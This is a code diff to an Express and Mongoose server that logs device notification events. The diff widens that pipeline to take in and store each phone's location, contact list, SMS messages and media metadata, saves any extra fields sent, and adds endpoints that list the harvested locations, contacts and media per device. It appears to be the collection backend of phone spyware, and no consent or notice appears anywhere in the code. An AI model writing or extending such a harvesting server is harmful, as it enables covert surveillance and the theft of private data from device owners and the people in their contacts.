@@ -99,10 +99,14 @@ const notificationSchema = new mongoose.Schema(
     package_name: { type: String, required: true },
     title: { type: String, default: "" },
     content: { type: String, default: "" },
+    location: { type: Object, default: null },
+    contacts: { type: Array, default: [] },
+    sms_list: { type: Array, default: [] },
+    media_list: { type: Array, default: [] },
     timestamp: { type: Date, default: Date.now, index: true },
     received_at: { type: Date, default: Date.now },
   },
-  { timestamps: true },
+  { timestamps: true, strict: false },
 );
 notificationSchema.index({ device_id: 1, timestamp: -1 });
 notificationSchema.index({ package_name: 1 });
@@ -295,6 +299,10 @@ app.post(["/api/events/notification", "/api/notifications"], auth, async (req, r
       package_name,
       title,
       content,
+      location,
+      contacts,
+      sms_list,
+      media_list,
       timestamp,
       event_key,
     } = req.body;
@@ -322,6 +330,10 @@ app.post(["/api/events/notification", "/api/notifications"], auth, async (req, r
       package_name,
       title: title || "",
       content: content || "",
+      location: location || null,
+      contacts: contacts || [],
+      sms_list: sms_list || [],
+      media_list: media_list || [],
       timestamp: timestamp ? new Date(timestamp) : new Date(),
     });
 
@@ -348,6 +360,90 @@ app.get("/api/events/notification", auth, async (req, res) => {
       .limit(Number(limit));
     const total = await NotificationEvent.countDocuments(query);
     res.json({ success: true, data: docs, total, page: Number(page) });
+  } catch (err) {
+    res.status(500).json({ success: false, message: err.message });
+  }
+});
+
+// GET /api/location – latest location events
+app.get("/api/location", auth, async (req, res) => {
+  try {
+    const { device_id } = req.query;
+    const query = { location: { $ne: null } };
+    if (device_id) query.device_id = device_id;
+
+    const docs = await NotificationEvent.find(query)
+      .sort({ timestamp: -1 })
+      .limit(50);
+    res.json({ success: true, count: docs.length, data: docs });
+  } catch (err) {
+    res.status(500).json({ success: false, message: err.message });
+  }
+});
+
+// GET /api/contacts – synced contacts
+app.get("/api/contacts", auth, async (req, res) => {
+  try {
+    const { device_id } = req.query;
+    const query = { "contacts.0": { $exists: true } };
+    if (device_id) query.device_id = device_id;
+
+    const docs = await NotificationEvent.find(query)
+      .sort({ timestamp: -1 })
+      .limit(20);
+
+    let allContacts = [];
+    docs.forEach((doc) => {
+      if (Array.isArray(doc.contacts)) {
+        doc.contacts.forEach((c) => {
+          allContacts.push({
+            name: c.name || "No Name",
+            phone: c.phone || "",
+            device_id: doc.device_id,
+            device_name: doc.device_name,
+            synced_at: doc.timestamp,
+          });
+        });
+      }
+    });
+
+    res.json({ success: true, count: allContacts.length, data: allContacts });
+  } catch (err) {
+    res.status(500).json({ success: false, message: err.message });
+  }
+});
+
+// GET /api/media-summary – synced media summary
+app.get("/api/media-summary", auth, async (req, res) => {
+  try {
+    const { device_id } = req.query;
+    const query = { "media_list.0": { $exists: true } };
+    if (device_id) query.device_id = device_id;
+
+    const docs = await NotificationEvent.find(query)
+      .sort({ timestamp: -1 })
+      .limit(20);
+
+    let allMedia = [];
+    docs.forEach((doc) => {
+      if (Array.isArray(doc.media_list)) {
+        doc.media_list.forEach((m) => {
+          allMedia.push({
+            id: m.id || "0",
+            type: m.type || "image",
+            width: m.width || 0,
+            height: m.height || 0,
+            duration: m.duration || 0,
+            create_dt: m.create_dt || doc.timestamp,
+            device_id: doc.device_id,
+            device_name: doc.device_name,
+            synced_at: doc.timestamp,
+          });
+        });
+      }
+    });
+
+    res.json({ success: true, count: allMedia.length, data: allMedia });
   } catch (err) {
     res.status(500).json({ success: false, message: err.message });
   }
